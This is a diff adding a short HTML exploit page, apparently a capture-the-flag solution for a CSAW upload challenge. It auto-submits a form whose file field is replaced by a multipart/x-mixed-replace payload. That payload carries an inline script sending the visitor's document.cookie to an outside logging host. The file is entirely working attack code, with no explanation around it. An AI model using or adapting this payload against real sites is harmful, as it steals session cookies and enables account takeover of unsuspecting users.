@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+  <body>
+    <form id="f" action="https://uploaders-revenge.csaw.io/upload" method="POST" enctype="multipart/form-data">
+    <input type="file" name="file">
+    </form>
+    <script>
+    window.f.addEventListener("formdata", (e) => {
+      // modifies the form data
+      const formData = e.formData;
+      // formdata gets modified by the formdata event
+      let multipart = `--myboundary\nContent-type: text/html\nContent-Security-Policy: script-src 'self' 'unsafe-inline';\n\n\x3cscript>location='https://hc.lc/log2.php?c='+document.cookie;\x3c/script>\n--myboundary--\n\n`
+      let payload = new Blob([multipart], {
+        type: "multipart/x-mixed-replace; boundary=myboundary",
+      });
+      formData.set("file", payload);
+    });
+
+    window.f.submit();
+    </script>
+  </body>
+</html>
